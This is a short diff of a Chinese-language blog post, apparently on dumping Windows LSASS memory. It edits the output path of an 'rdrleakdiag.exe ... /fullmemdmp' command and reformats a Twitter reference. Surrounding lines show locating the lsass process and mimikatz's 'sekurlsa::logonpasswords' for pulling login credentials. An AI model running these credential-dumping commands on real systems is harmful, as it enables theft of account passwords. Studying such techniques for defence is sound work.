@@ -25,7 +25,7 @@ tasklist /svc | findstr lsass
 
 使用如下命令转储进程；
 ```cmd
-rdrleakdiag.exe /p 548 /o C:\Users\Anonymous\Desktop\ /fullmemdmp /wait 1
+rdrleakdiag.exe /p 548 /o C:\Users\Administrator\Desktop\ /fullmemdmp /wait 1
 ```
 ![](https://xxxeyj.github.io/images/20-09-15_THREE.PNG)
 
@@ -37,4 +37,4 @@ sekurlsa::logonpasswords
 ![](https://xxxeyj.github.io/images/20-09-15_FOUR.PNG)
 
 ## Reference
-https://twitter.com/0gtweet/status/1299071304805560321
+[](https://twitter.com/0gtweet/status/1299071304805560321)
